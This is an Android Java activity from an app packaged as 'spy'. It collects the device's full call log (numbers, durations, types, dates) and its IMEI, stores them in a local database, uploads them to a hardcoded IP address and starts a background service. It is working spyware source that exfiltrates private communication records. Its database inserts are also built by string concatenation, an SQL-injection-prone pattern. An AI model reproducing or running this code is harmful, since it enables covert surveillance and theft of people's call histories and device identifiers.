package com.example.subhasis.spy;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import java.util.Date;

public class call_logs extends AppCompatActivity {
    public static final int RequestPermissionCode = 1;
    public static final int RequestIMEIPermissionCode = 2;
    private static final String TAG = "call_logs";
    TelephonyManager telephonyManager;
    String IMEI_Number_Holder;
    String sql;
    public  static  String ip="172.27.27.89";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_call_logs);

        EnableRuntimePermission();

        Cursor mCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null,
                null, null);
        sql= "CREATE TABLE IF NOT EXISTS call_logs(ID INTEGER PRIMARY KEY AUTOINCREMENT, phonenumber VARCHAR(15),callduration VARCHAR(30), calltype VARCHAR(30), calldate VARCHAR(30), imei VARCHAR(18));";
        SQLiteDatabase sqLiteDatabase = getBaseContext().openOrCreateDatabase("upload.db", MODE_PRIVATE, null);
        sqLiteDatabase.execSQL(sql);

        int number = mCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int date = mCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = mCursor.getColumnIndex(CallLog.Calls.DURATION);
        int type = mCursor.getColumnIndex(CallLog.Calls.TYPE);
        telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        IMEI_Number_Holder = telephonyManager.getDeviceId();
        StringBuilder sb = new StringBuilder();
        while (mCursor.moveToNext()) {
            String phnumber = mCursor.getString(number);
            String callduration = mCursor.getString(duration);
            String calltype = mCursor.getString(type);
            String calldate = mCursor.getString(date);
            Date d = new Date(Long.valueOf(calldate));
            String callTypeStr = "";
            switch (Integer.parseInt(calltype)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callTypeStr = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callTypeStr = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callTypeStr = "Missed";
                    break;
            }
            sb.append("Phone number " + phnumber);
            sb.append(System.getProperty("line.separator"));
            sb.append("Call duration " + callduration);
            sb.append(System.getProperty("line.separator"));
            sb.append("Call type " + callTypeStr);
            sb.append(System.getProperty("line.separator"));
            sb.append("Call date " + d);
            sb.append("---------------------------");
            sb.append(System.getProperty("line.separator"));
            sql = "INSERT INTO call_logs(phonenumber, callduration, calltype, calldate, imei) VALUES('" + phnumber+ "','" + callduration + "','" + callTypeStr + "','" + d +"','"+ IMEI_Number_Holder +"');";

            Log.d(TAG, "onOptionsItemSelected: INSERTED INTO cont DATABASE");
           try {
                sqLiteDatabase.execSQL(sql);

            }catch (Exception e){
                Log.e(TAG, "onOptionsItemSelected:Repeated Values " );
            }
        }
        sqLiteDatabase.close();
        PostData postData=new PostData();
        postData.execute("http://"+ip+"/", "2");

        TextView callDetails = (TextView) findViewById(R.id.calllog);
        callDetails.setText(sb.toString());

        startService(new Intent(this, BackgroundService.class));

















    }





    public void EnableRuntimePermission() {

        if (ActivityCompat.shouldShowRequestPermissionRationale(
                call_logs.this,
                Manifest.permission.READ_CONTACTS)) {

            Toast.makeText(call_logs.this, "CONTACTS permission allows us to Access call logs", Toast.LENGTH_LONG).show();

        } else {

            ActivityCompat.requestPermissions(call_logs.this, new String[]{
                    Manifest.permission.READ_CALL_LOG}, RequestPermissionCode);

        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "onCreate: Permission Granted");
            //READ_CODE_GRANTED = true;

        } else {
            Log.d(TAG, "onCreate: Requesting Permission");
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, RequestIMEIPermissionCode);

        }
    }

    @Override
    public void onRequestPermissionsResult(int RC, String per[], int[] PResult) {

        switch (RC) {

            case RequestPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(call_logs.this, "Permission Granted, Now your application can access CALL_LOGS.", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(call_logs.this, "Permission Canceled, Now your application cannot access CALL_LOGS.", Toast.LENGTH_LONG).show();

                }
                break;
            case RequestIMEIPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(this, "Permission Granted, Now your application can access READ_PHONE_STATE.", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(this, "Permission Canceled, Now your application cannot access READ_PHONE_STATE.", Toast.LENGTH_LONG).show();

                }
                break;
        }
    }



    @Override
    public void onBackPressed() {
        startActivity(new Intent(getApplicationContext(), MainActivity.class));
        super.onBackPressed();
        this.finish();
    }

    }




